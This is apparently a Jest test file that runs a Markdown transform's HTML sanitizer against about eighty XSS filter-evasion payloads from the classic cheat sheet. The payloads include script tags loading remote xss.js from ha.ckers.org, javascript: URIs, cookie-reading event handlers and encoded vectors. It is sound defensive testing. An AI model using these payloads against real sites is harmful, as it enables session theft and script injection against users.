/* eslint no-useless-escape: 0 */

import transform from '../src/transform';

const transformYfm = (text: string, options?: Parameters<typeof transform>[1]) => {
    const {
        result: {html},
    } = transform(text, {
        allowHTML: true,
        ...options,
    });
    return html;
};

// https://sking7.github.io/articles/218647712.html

describe('XSS Filter', () => {
    it('XSS Locator', () => {
        const input = `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">'><script>alert(String.fromCharCode(88,83,83))</script>`;
        const expected = `<p>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;"&gt;'&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('XSS locator 2', () => {
        const input = `'';!--"<XSS>=&{()}`;
        const expected = `<p>'';!--"=&amp;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('No Filter Evasion', () => {
        const input = `<script src=http://ha.ckers.org/xss.js></script>`;
        const expected = '';

        expect(transformYfm(input)).toBe(expected);
    });

    it('Image XSS using the JavaScript directive', () => {
        const input = `<img src="javascript:alert('XSS');">`;
        const expected = '<img />';

        expect(transformYfm(input)).toBe(expected);
    });

    it('No quotes and no semicolon', () => {
        const input = `<img src=javascript:alert('XSS')>`;
        const expected = `<p>&lt;img src=javascript:alert('XSS')&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Case insensitive XSS attack vector', () => {
        const input = `<img src=JaVaScRiPt:alert('XSS')>`;
        const expected = `<p>&lt;img src=JaVaScRiPt:alert('XSS')&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('HTML entities', () => {
        const input = `<img src=javascript:alert("XSS")>`;
        const expected = `<p>&lt;img src=javascript:alert("XSS")&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Grave accent obfuscation', () => {
        const input = "<img src='javascript:alert(\"RSnake says, 'XSS'\")'>";
        const expected = `<p>&lt;img src='javascript:alert("RSnake says, 'XSS'")'&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Malformed A tags', () => {
        const input = '<a onmouseover=alert(document.cookie)>xxs link</a>';
        const expected = `<p><a>xxs link</a></p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Malformed img tags', () => {
        const input = '<img """><script>alert("XSS")</script>">';
        const expected = `<p>&lt;img """&gt;"&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('fromCharCode', () => {
        const input = '<img src=javascript:alert(String.fromCharCode(88,83,83))>';
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Default src tag to get past filters that check src domain', () => {
        const input = `<img src=# onmouseover="alert('xxs')">`;
        const expected = `<img src=\"#\" />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Default src tag by leaving it empty', () => {
        const input = `<img src= onmouseover="alert('xxs')">`;
        const expected = `<p>&lt;img src= onmouseover="alert('xxs')"&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Default src tag by leaving it out entirely', () => {
        const input = `<img onmouseover="alert('xxs')">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Decimal HTML character references', () => {
        const input = `<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
        &#39;&#88;&#83;&#83;&#39;&#41;>`;
        const expected = `<p>&lt;img src=javascript:alert(<br />\n'XSS')&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Decimal HTML character references without trailing semicolons', () => {
        const input = `<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
        #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`;
        const expected = `<p>&lt;img src=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;<br />\n#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Hexadecimal HTML character references without trailing semicolons', () => {
        const input = `<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Embedded tab', () => {
        const input = `<img src="jav	ascript:alert('XSS');">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Embedded Encoded tab', () => {
        const input = `<img src="jav&#x09;ascript:alert('XSS');">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Embedded newline to break up XSS', () => {
        const input = `<img src="jav&#x0A;ascript:alert('XSS');">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Embedded carriage return to break up XSS', () => {
        const input = `<img src="jav&#x0D;ascript:alert('XSS');">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Null breaks up JavaScript directive', () => {
        const input = `perl -e 'print "<img src=java\0script:alert(\"XSS\")>";' > out`;
        const expected = `<p>perl -e 'print "&lt;img src=java�script:alert("XSS")&gt;";' &gt; out</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Spaces and meta chars before the JavaScript in images for XSS', () => {
        const input = `<img src=" &#14;  javascript:alert('XSS');">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Non-alpha-non-digit XSS 1', () => {
        const input = `<script/xss src="http://ha.ckers.org/xss.js"></script>`;
        const expected = `<p>&lt;script/xss src="http://ha.ckers.org/xss.js"&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Non-alpha-non-digit XSS 2', () => {
        const input = '<body onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>';
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Non-alpha-non-digit XSS 3', () => {
        const input = '<script/src="http://ha.ckers.org/xss.js"></script>';
        const expected = `<p>&lt;script/src="http://ha.ckers.org/xss.js"&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Non-alpha-non-digit XSS 4', () => {
        const input = '<<script>alert("XSS");//<</script>';
        const expected = `<p>&lt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('No closing script tags', () => {
        const input = '<script src=http://ha.ckers.org/xss.js?< b >';
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Protocol resolution in script tags', () => {
        const input = '<script src=//ha.ckers.org/.j>';
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Half open HTML/JavaScript XSS vector', () => {
        const input = `<img src="javascript:alert('XSS')"`;
        const expected = `<p>&lt;img src="javascript:alert('XSS')"</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Double open angle brackets', () => {
        const input = `<iframe src=http://ha.ckers.org/scriptlet.html <`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Escaping JavaScript escapes', () => {
        const input = `\";alert('XSS');//`;
        const expected = `<p>";alert('XSS');//</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('End title tag', () => {
        const input = `</title><script>alert("XSS");</script>`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('input image', () => {
        const input = `<input type="image" src="javascript:alert('XSS');">`;
        const expected = `<input type=\"image\" />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('body image', () => {
        const input = `<body background="javascript:alert('XSS')">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('img Dynsrc', () => {
        const input = `<img dynsrc="javascript:alert('XSS')">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('img lowsrc', () => {
        const input = `<img lowsrc="javascript:alert('XSS')">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('List-style-image', () => {
        const input = `<style>li {list-style-image: url("javascript:alert('XSS')");}</style><UL><LI>XSS</br>`;
        const expected = `<style></style><ul><li>XSS<br /></li></ul>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('VBscript in an image', () => {
        const input = `<img src='vbscript:msgbox("XSS")'>`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Livescript', () => {
        const input = `<img src="livescript:[code]">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('body tag', () => {
        const input = `<body onload=alert('XSS')>`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('BGSOUND', () => {
        const input = `<bgsound src="javascript:alert('XSS');">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('& JavaScript includes', () => {
        const input = `<br SIZE="&{alert('XSS')}">`;
        const expected = `<br size=\"&amp;{alert('XSS')}\" />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style sheet', () => {
        const input = `<link rel="stylesheet" href="javascript:alert('XSS');">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Remote style sheet', () => {
        const input = `<link rel="stylesheet" href="http://ha.ckers.org/xss.css">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Remote style sheet part 2', () => {
        const input = `<style>@import'http://ha.ckers.org/xss.css';</style>`;
        const expected = `<style></style>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Remote style sheet part 3', () => {
        const input = `<meta http-equiv="Link" Content="<http://ha.ckers.org/xss.css>; rel=stylesheet">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Remote style sheet part 4', () => {
        const input = `<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>`;
        const expected = `<style></style>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style tags with broken up JavaScript for XSS', () => {
        const input = `<style>@im\port'\ja\vasc\ript:alert("XSS")';</style>`;
        const expected = `<style></style>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style tags with broken up JavaScript for XSS part 2', () => {
        const input = `<img style="xss:expr/*XSS*/ession(alert('XSS'))">`;
        const expected = `<img />`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('img style with expression', () => {
        const input = `exp/*<a style='no\\xss:noxss("*//*");`;
        const expected = `<p>exp/<em>&lt;a style='no\\xss:noxss("</em>//*");</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('img style with expression', () => {
        const input = `exp/*<a style='no\\xss:noxss("*//*");`;
        const expected = `<p>exp/<em>&lt;a style='no\\xss:noxss("</em>//*");</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style tag', () => {
        const input = `<style type="text/javascript">alert('XSS');</style>`;
        const expected = `<style type=\"text/javascript\">alert('XSS');</style>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style tag using background-image', () => {
        const input = `<style>.xss{background-image:url("javascript:alert('XSS')");}</style><a class=XSS></a>`;
        const expected = `<style>.xss {\n  background-image: url(\"javascript:alert('XSS')\");\n}</style><a class=\"XSS\"></a>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('style tag using background', () => {
        const input = `<style type="text/css">body{background:url("javascript:alert('XSS')")}</style>`;
        const expected = `<style type=\"text/css\"></style>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Anonymous HTML with style attribute', () => {
        const input = `<xss style="xss:expression(alert('XSS'))">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Local htc file', () => {
        const input = `<xss style="behavior: url(xss.htc);">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('US-ASCII encoding', () => {
        const input = `¼script¾alert(¢XSS¢)¼/script¾`;
        const expected = `<p>¼script¾alert(¢XSS¢)¼/script¾</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('meta', () => {
        const input = `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('iframe', () => {
        const input = `<iframe src="javascript:alert('XSS');"></iframe>`;
        const expected = `<iframe></iframe>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('iframe Event based', () => {
        const input = `<iframe src=# onmouseover="alert(document.cookie)"></iframe>`;
        const expected = `<iframe src=\"#\"></iframe>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('frame', () => {
        const input = `<frameset><frame src="javascript:alert('XSS');"></frameset>`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('TABLE', () => {
        const input = `<table background="javascript:alert('XSS')">`;
        const expected = `<table background=\"javascript:alert('XSS')\"></table>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('TD', () => {
        const input = `<table><td background="javascript:alert('XSS')">`;
        const expected = `<table><tbody><tr><td background=\"javascript:alert('XSS')\"></td></tr></tbody></table>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('DIV background-image', () => {
        const input = `<div style="background-image: url(javascript:alert('XSS'))">`;
        const expected = `<div></div>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('DIV background-image with unicoded XSS exploit', () => {
        const input = `<div style="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`;
        const expected = `<div style=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"></div>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('DIV background-image with unicoded XSS exploit 2', () => {
        const input = `<div style="background-image: url(&#1;javascript:alert('XSS'))">`;
        const expected = `<div></div>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('DIV expression', () => {
        const input = `<div style="width: expression(alert('XSS'));">`;
        const expected = `<div style=\"width:expression(alert('XSS'))\"></div>`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Downlevel-Hidden block', () => {
        const input = `<!--[if gte IE 4]>\n<script>alert('XSS');</script>\n<![endif]-->`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('BASE tag', () => {
        const input = `<base href="javascript:alert('XSS');//">`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('OBJECT tag', () => {
        const input = `<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>`;
        const expected = `<p></p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Using an EMBED tag you can embed a Flash movie that contains XSS', () => {
        const input = `<embed src="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></embed>`;
        const expected = `<p>&lt;embed src="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"&gt;</p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('You can EMBED SVG which can contain your XSS vector', () => {
        const input = `<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></embed>`;
        const expected = `<p></p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('XML tag', () => {
        const input = `<xml></xml>`;
        const expected = `<p></p>\n`;

        expect(transformYfm(input)).toBe(expected);
    });

    it('Assuming you can only fit in a few characters and it filters against ".js"', () => {
        const input = `<script src="http://ha.ckers.org/xss.jpg"></script>`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('SSI (Server Side Includes)', () => {
        const input = `<!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'IPT src=http://ha.ckers.org/xss.js></script>'"-->`;
        const expected = ``;

        expect(transformYfm(input)).toBe(expected);
    });

    it('PHP', () => {
        const input = `<? echo('<SCR)';\necho('IPT>alert("XSS")</SCRIPT>'); ?>`;
        const expected = `alert(\"XSS\")'); ?&gt;`;

        expect(transformYfm(input)).toBe(expected);
    });
});
